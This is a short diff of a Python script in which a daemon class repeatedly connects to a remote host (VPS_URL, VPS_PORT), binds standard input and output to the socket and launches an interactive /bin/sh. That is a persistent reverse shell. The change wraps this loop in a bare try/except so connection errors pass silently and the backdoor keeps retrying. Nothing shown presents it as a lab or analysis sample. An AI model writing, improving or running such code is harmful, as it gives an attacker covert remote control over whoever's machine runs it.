@@ -109,13 +109,16 @@ class Daemon:
 class MyDaemon(Daemon):
     def run(self):
         while True:
-            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-            s.connect((VPS_URL,VPS_PORT))
-            os.dup2(s.fileno(),0)
-            os.dup2(s.fileno(),1)
-            os.dup2(s.fileno(),2)
-            subprocess.call(["/bin/sh","-i"])
-            time.sleep(10)
+            try:
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect((VPS_URL,VPS_PORT))
+                os.dup2(s.fileno(),0)
+                os.dup2(s.fileno(),1)
+                os.dup2(s.fileno(),2)
+                subprocess.call(["/bin/sh","-i"])
+                time.sleep(10)
+            except:
+                pass
 
 def main():
     home = os.path.expanduser("~")
